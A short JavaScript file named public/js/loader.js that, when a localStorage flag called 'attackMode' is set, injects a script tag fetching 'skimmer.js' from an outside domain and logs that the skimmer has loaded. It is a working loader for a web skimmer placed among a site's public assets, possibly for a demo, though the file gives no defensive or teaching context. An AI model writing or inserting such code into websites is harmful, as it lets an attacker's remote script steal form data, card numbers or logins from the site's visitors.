// public/js/loader.js
(function() {
  if (localStorage.getItem('attackMode') === 'on') {
    const s = document.createElement('script');
    // 👇 HTTPS only!
    s.src = 'https://skimmer.solutionsedge.io/skimmer.js';
    s.onload = () => console.warn('⚠️ Skimmer loaded over HTTPS');
    document.head.appendChild(s);
  }
})();